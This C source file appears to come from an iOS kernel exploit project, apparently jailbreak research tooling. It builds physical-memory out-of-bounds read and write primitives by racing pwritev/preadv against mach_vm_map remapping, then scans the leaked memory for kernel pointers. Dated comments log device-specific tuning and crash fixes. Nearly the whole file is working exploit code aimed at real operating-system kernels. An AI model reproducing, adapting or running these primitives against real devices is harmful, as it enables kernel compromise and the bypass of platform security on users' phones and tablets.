#include "phys_oob.h"

#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#include "surface.h"
#include <errno.h>

// creates physically contiguous mapping in Purplegfxmem and sets marker to it
void cs2_init_phys_rw(mach_vm_size_t contiguous_mapping_size) {
    cs2_ctx.pc_size = contiguous_mapping_size;
    kern_return_t kr = cs2_create_pc_mapping(&cs2_ctx.pc_object, &cs2_ctx.pc_address, cs2_ctx.pc_size);
    if (kr != KERN_SUCCESS) {
        LOG_ERR("cs2_create_pc_mapping: %s (%d)", mach_error_string(kr), kr);
        return;
    }

    // pc -> physically contiguous
    LOG("pc_object: %#x", cs2_ctx.pc_object);
    LOG("pc_address: %#llx", cs2_ctx.pc_address);

    // set random marker
    memset_pattern8((void*)cs2_ctx.pc_address, &cs2_ctx.random_marker, cs2_ctx.pc_size);

    // "free target" will be the addr of the pc mapping
    cs2_ctx.free_target = cs2_ctx.pc_address;
    cs2_ctx.free_target_size = cs2_ctx.pc_size;

    atomic_store_explicit(&cs2_ctx.shared->free_target_sync, cs2_ctx.free_target, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_target_size_sync, cs2_ctx.free_target_size, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->go_sync, 1, memory_order_seq_cst);
}

static uint64_t first_try_logs = 0;

kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    /* 2026-11-21 the DETERMINISTIC SECOND-TAP crash fix (3 receipts:
       P007OpenOnly-205702/210057/210504, all EXC_BAD_ACCESS at 0x18/0x30
       in this fn from a cskrw double-tap). The first run's cleanup doesn't
       fully reset; the second run's memset zeroes cs2_ctx.shared to NULL;
       the setup then fails silently (fd table / port table / mappings
       still held), and this fn dereferences shared->target_object_sync
       at NULL+0x18 → the crash. NOT kernel corruption — a userspace NULL.
       Fix: guard ALL the shared/pc/fd prerequisites before any access. */
    if (!cs2_ctx.shared || !cs2_ctx.pc_address || cs2_ctx.read_fd < 0) {
        LOG_ERR("cs2_oob_read: PREREQ FAIL (shared=%p pc_addr=0x%llx read_fd=%d) "
                "— the setup failed (second-tap state?); honest stop",
                cs2_ctx.shared,
                (unsigned long long)cs2_ctx.pc_address,
                cs2_ctx.read_fd);
        return KERN_FAILURE;
    }
    // target_object_sync here on first pass is set to memory_object from mem entry
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    // offset we're at in the search mapping
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    // set iov base to physically contiguous addr + 0x3f00
    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);

    /* OG lane: Dopamine ClearSword verbatim. iov_len = offset+size, HIT only
       on pwritev EFAULT (w == -1) followed by pread; first qword marker
       comparison. The only lab addition is the 300 s deadline so a failed
       train returns instead of spinning forever. */
    if (!cs2_ctx.copy_confusion_lane) {
        cs2_ctx.iov.iov_len = (size_t)(offset + size);
        memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
        for (uint64_t try_idx = 0;
             try_idx < (cs2_ctx.highiest_success_idx + 100ull); try_idx++) {
            if (cs2_expired()) {
                LOG_ERR("OG lane budget expired (try=%llu) — honest failure",
                        (unsigned long long)try_idx);
                return KERN_FAILURE;
            }
            atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
            ssize_t w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
            while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1) {
                if (cs2_expired()) return KERN_FAILURE;
            }
            mach_vm_address_t map_addr = cs2_ctx.pc_address;
            kern_return_t kr = mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0,
                                           VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                           cs2_ctx.pc_object, 0, false,
                                           VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            if (kr != KERN_SUCCESS) {
                LOG_ERR("OG oob_read mach_vm_map: %s (%d)", mach_error_string(kr), kr);
                return KERN_FAILURE;
            }
            if (w == -1) {
                pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
                uint64_t marker = 0;
                memcpy(&marker, buffer, sizeof(marker));
                if (marker != cs2_ctx.random_marker) {
                    cs2_ctx.success_read_count++;
                    if (try_idx > cs2_ctx.highiest_success_idx)
                        cs2_ctx.highiest_success_idx = try_idx;
                    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0,
                                          memory_order_seq_cst);
                    return KERN_SUCCESS;
                }
            }
        }
        atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
        return KERN_FAILURE;
    }
    /* Two capture lanes (24A435 recovered TAP 2026-11-04):
         OG / A13 18.x: iov_len = 0x1000, HIT only when pwritev EFAULT (w==-1)
           then pread. That is Dopamine ClearSword verbatim.
         27.0 / T8150: pwritev returns the full length (w=4096 on verbatim,
           w=16384 on calib). LightSword ID-sweep: ok=30720 fail=0, PARTIAL
           and WRONG live on the SUCCESS copy. Inspect the file whenever
           copy_confusion_lane is set. iov_len = vm_page_size matches calib.
       hop-1 cluster_*_contig stays closed (EINVAL since 26.1). */
    size_t iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    cs2_ctx.iov.iov_len = iov_len;

    memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
    memcpy((void*)(cs2_ctx.pc_address + 0x3f00 + offset), &cs2_ctx.random_marker, sizeof(uint64_t));

    bool read_race_succeeded = false;
    ssize_t w = 0;

    /* volume law: 100 tries × 8 mappings × 0x2000 pages = VM machine-gun
       (configd watchdog 2026-11-04 19:36 EST, P007OpenOnly 1.24GiB / 13M faults).
       copy27: 8 tries until first HIT, then 16. OG EFAULT: adaptive 100+. */
    /* 2026-11-21 iPad receipt (cs2_krw_log 9): 54,158 kr-fails vs 748
       successes — the erroring windows each burned 8 pwritev attempts and
       the budget died at pass 0 map 6 (the multi-pass engine NEVER reached
       pass 2, the re-interleave pass that places inpcb pages). Fix: the
       pre-hit window retries drop 8 -> 2 (two attempts show the race
       shape; a window that errors twice is dead this pass); post-hit stays
       16. This frees ~4x the sweep time so pass 2+ actually runs. */
    uint64_t max_tries = cs2_ctx.copy_confusion_lane
        ? (cs2_ctx.highiest_success_idx ? 16ull : 2ull)
        : (cs2_ctx.highiest_success_idx + 100ull);
    for (uint64_t try_idx = 0; try_idx < max_tries; try_idx++) {
        if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // trigger bug to read oob_offset oob
        w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
        int saved_errno = errno;
        if (try_idx == 0 && first_try_logs++ < 6)
            LOG("oob try0: w=%zd errno=%d (win-cap=%llu) lane=%s iov=%zx",
                w, (w == -1) ? saved_errno : 0,
                (unsigned long long)cs2_ctx.highiest_success_idx,
                cs2_ctx.copy_confusion_lane ? "copy27" : "efault",
                iov_len);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        // put physicallly contiguous mapping back
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_read: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        if (w == -1 || (cs2_ctx.copy_confusion_lane && w > 0)) {
            /* Pre-fill so a short pread cannot look like a PARTIAL HIT
               (calloc zeros / leftover from the previous page). */
            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
            ssize_t nread = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
            if (nread < 8) {
                usleep(1);
                continue;
            }
            uint64_t q0 = 0, q1 = 0;
            memcpy(&q0, buffer, sizeof(q0));
            if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
            uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
            uint64_t zerofill_n = 0;
            uint64_t anchor_n = 0;   /* own fil-tag (real heap anchor) qwords */
            static uint64_t kptr_seen[8] = {0};
            static int kptr_seen_n = 0;
            uint64_t unmarked_q[12] = {0}; int unmarked_q_n = 0;
            size_t nq = (size_t)nread / 8;
            for (size_t qi = 0; qi < nq; qi++) {
                uint64_t q = 0;
                memcpy(&q, buffer + qi * 8, sizeof(q));
                if (q == cs2_ctx.random_marker) continue;
                /* anchor-tag law: the REAL same-boot heap anchor is OUR OWN
                   fill. Skip before any shape count — an anchor-tagged
                   window is never a KERNEL POINTER claim. */
                if (cs2_own_anchor(q)) { anchor_n++; continue; }
                if (q == 0) { zerofill_n++; continue; }  /* v2: the 0x7000 zero-hole page is NOT kernel content */
                unmarked++;
                if (!first_foreign) first_foreign = q;
                /* v2: the 24A435 band (0xfffffe00-class kvas) joins the 23F77 band */
                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                    q >= 0xfffffe0000000000ull) {
                    kptr_n++;
                    if (kptr_seen_n < 8) kptr_seen[kptr_seen_n++] = q;
                }
                if (unmarked_q_n < 12) unmarked_q[unmarked_q_n++] = q;
                if ((q >> 32) == 0xc0dec0deull) spray_n++;
            }
            /* OG: wholesale page replace, q0 != marker.
               copy27: calib PARTIAL is mixed (q0 still marker, later qwords
               foreign). Hunt those windows too. hop-1 stays closed. */
            bool wholesale = (unmarked > 0 && q0 != cs2_ctx.random_marker);
            bool partial = (cs2_ctx.copy_confusion_lane && unmarked > 0 && q0 == cs2_ctx.random_marker);
            if (unmarked == 0 && zerofill_n > 0) {
                static uint64_t hole_logs = 0;
                if (cs2_ctx.copy_confusion_lane && hole_logs++ < 6)
                    LOG("[oob] HOLEWINDOW lane=copy27 zerofill=%llu w=%zd (the 0x7000 hole -- HUNT follows)",
                        (unsigned long long)zerofill_n, w);
            }
            if (wholesale || partial) {
                read_race_succeeded = true;
                cs2_ctx.success_read_count += 1;
                if (try_idx > cs2_ctx.highiest_success_idx) {
                    cs2_ctx.highiest_success_idx = try_idx;
                }
                {
                    static uint64_t hit_logs = 0;
                    if (hit_logs++ < 8) {
                        const char *cls = "other";
                        if (kptr_n) cls = "KERNEL POINTER";
                        else if (anchor_n) cls = "anchor-tagged";
                        else if (spray_n) cls = "spray-page tag";
                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu anchor=%llu",
                            w == -1 ? "efault" : "copy27",
                            partial ? "PARTIAL" : "WHOLESALE",
                            cls, w, (unsigned long long)try_idx, q0, first_foreign,
                            (unsigned long long)unmarked,
                            (unsigned long long)kptr_n,
                            (unsigned long long)spray_n,
                            (unsigned long long)anchor_n);
                    }
                }
                    /* v2: the unmarked dump + the kptr rows.
                       2026-11-19 cs2_krw_log 3: 1.6k windows carried the
                       same two constants — 26k spam lines. Dump only the
                       first 8 distinct foreign values. */
                    {
                        static uint64_t dumped_first[8] = {0};
                        static int dumped_n = 0;
                        int fresh = 1;
                        for (int di = 0; di < dumped_n; di++)
                            if (dumped_first[di] == first_foreign) { fresh = 0; break; }
                        if (fresh) {
                            if (dumped_n < 8) dumped_first[dumped_n++] = first_foreign;
                            for (int ui = 0; ui < unmarked_q_n; ui++)
                                LOG("[oob] HIT unmarked[%d]=%#llx", ui, (unsigned long long)unmarked_q[ui]);
                        }
                    }
                    /* 2026-11-21 iPad receipt: one all-identical window printed
                       2,768 kptr rows. Dedup: print DISTINCT values; if all
                       identical, one row with the count. */
                    {
                        int distinct_n = 0;
                        uint64_t distinct[8] = {0};
                        for (int ki = 0; ki < kptr_seen_n; ki++) {
                            int dup = 0;
                            for (int di = 0; di < distinct_n; di++)
                                if (distinct[di] == kptr_seen[ki]) { dup = 1; break; }
                            if (!dup && distinct_n < 8) distinct[distinct_n++] = kptr_seen[ki];
                        }
                        if (distinct_n == 1 && kptr_n > kptr_seen_n) {
                            LOG("[oob] HIT kptr ALL-IDENTICAL value=%#llx count=%llu (a repeated-pattern kernel page — dump follows)",
                                (unsigned long long)distinct[0],
                                (unsigned long long)kptr_n);
                        } else {
                            for (int di = 0; di < distinct_n; di++)
                                LOG("[oob] HIT kptr[%d]=%#llx", di, (unsigned long long)distinct[di]);
                        }
                    }
                    /* v2: the bidirectional HUNT around this anchor (hole
                       geometry and real-content windows) — +/-6 pages,
                       stop at the first real-content page. */
                    {
                        static const off_t steps2[11] = { 0x1000, -0x1000, 0x2000, -0x2000, 0x3000, -0x3000, 0x4000, -0x4000, 0x5000, -0x5000, 0x6000 };
                        for (int si2 = 0; si2 < 11; si2++) {
                            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
                            ssize_t wn = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset + steps2[si2]);
                            if (wn < 8) continue;
                            uint64_t wu = 0, wk = 0, wz = 0, wf = 0;
                            static uint64_t wk_seen[4] = {0};
                            int wk_n = 0;
                            size_t wnq = (size_t)wn / 8;
                            for (size_t wqi = 0; wqi < wnq; wqi++) {
                                uint64_t wq = 0;
                                memcpy(&wq, buffer + wqi * 8, sizeof(wq));
                                if (wq == cs2_ctx.random_marker) continue;
                                if (cs2_own_anchor(wq)) continue;   /* own fill (any anchor), not a kptr claim */
                                if (wq == 0) { wz++; continue; }
                                wu++;
                                if (!wf) wf = wq;
                                if ((wq >> 36) == 0xfffffff0ull || (wq >> 32) == 0xfffffe00ull ||
                                    wq >= 0xfffffe0000000000ull) {
                                    wk++;
                                    if (wk_n < 4) wk_seen[wk_n++] = wq;
                                }
                            }
                            if (wu) {
                                static uint64_t whunt_logs = 0;
                                whunt_logs++;
                                /* 2026-11-19: identical content lines flooded
                                   1.5k rows. Pointers print ALWAYS; content
                                   prints first 48 + every 256th. */
                                if (wk || whunt_logs <= 48 || (whunt_logs % 256) == 0)
                                    LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx (line %llu)",
                                        (unsigned long long)(0x3f00 + offset + steps2[si2]),
                                        (unsigned long long)wu, (unsigned long long)wz,
                                        (unsigned long long)wk, wk ? "  <-- POINTERS" : "  <-- CONTENT",
                                        (unsigned long long)wf,
                                        (unsigned long long)whunt_logs);
                            }
                            for (int ki = 0; ki < wk_n && ki < 4; ki++)
                                LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)wk_seen[ki]);
                            if (wu > 0) break;
                        }
                    }
                    break;
            }
            {
                static uint64_t miss_logs = 0;
                miss_logs++;
                if (cs2_ctx.copy_confusion_lane && (miss_logs <= 4 || (miss_logs % 2048) == 0))
                    LOG("oob MISS lane=copy27 q0=%#llx q1=%#llx (full marker, UPL neighbor silent)",
                        q0, q1);
            }
            /* v3: THE HUNT ON EVERY SUCCESS — the HIT path's hunt never
                   fired this boot (zero non-hole content); the hole windows
                   ARE the neighbor hunt's job. Bidirectional +/-6 pages,
                   tap-capped. */
                {
                    static uint64_t g_hunts = 0;
                    if (g_hunts++ < 48) {
                        static const off_t hs[13] = { 0x1000, -0x1000, 0x2000, -0x2000, 0x3000, -0x3000, 0x4000, -0x4000, 0x5000, -0x5000, 0x6000, -0x6000, 0x7000 };
                        for (int hi = 0; hi < 13; hi++) {
                            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
                            ssize_t hn = pread(cs2_ctx.read_fd, buffer, size, (off_t)(0x3f00 + offset) + hs[hi]);
                            if (hn < 8) continue;
                            uint64_t hu = 0, hk = 0, hz = 0, hf = 0;
                            static uint64_t hk_seen[4] = {0};
                            int hk_n = 0;
                            size_t hnq = (size_t)hn / 8;
                            for (size_t hqi = 0; hqi < hnq; hqi++) {
                                uint64_t hq = 0;
                                memcpy(&hq, buffer + hqi * 8, sizeof(hq));
                                if (hq == cs2_ctx.random_marker) continue;
                                if (cs2_own_anchor(hq)) continue;   /* own fill (any anchor), not a kptr claim */
                                if (hq == 0) { hz++; continue; }
                                hu++;
                                if (!hf) hf = hq;
                                if ((hq >> 36) == 0xfffffff0ull || (hq >> 32) == 0xfffffe00ull ||
                                    hq >= 0xfffffe0000000000ull) {
                                    hk++;
                                    if (hk_n < 4) hk_seen[hk_n++] = hq;
                                }
                            }
                            if (hu)
                                LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx",
                                    (unsigned long long)((off_t)(0x3f00 + offset) + hs[hi]),
                                    (unsigned long long)hu, (unsigned long long)hz,
                                    (unsigned long long)hk, hk ? "  <-- POINTERS" : "  <-- CONTENT",
                                    (unsigned long long)hf);
                            for (int ki = 0; ki < hk_n && ki < 4; ki++)
                                LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)hk_seen[ki]);
                            if (hu > 0) break;
                        }
                    }
                }
            usleep(1);
        }

        if (try_idx == 500) {
            // LOG_DEBUG("we failed");
            break;
        }
    }
    // LOG_DEBUG("read race result success is: %s", read_race_succeeded ? "true" : "false");
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
}

// retry until success
void cs2_oob_read_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
    /* Upstream retries forever; the app must end. The deadline is the only
       addition here. */
    while (!cs2_expired()) {
        kern_return_t kr = cs2_oob_read(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) break;
    }
}

void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
    cs2_ctx.iov.iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
        ? (size_t)vm_page_size
        : (size_t)(offset + size);
    // read from buffer into fd
    pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        if (cs2_expired()) break;
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // write from the fd into (oob) memory
        preadv(cs2_ctx.write_fd, &cs2_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1) {
            if (cs2_expired()) break;
        }

        mach_vm_address_t map_addr = cs2_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, cs2_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("cs2_oob_write: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return;
        }
    }

    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}
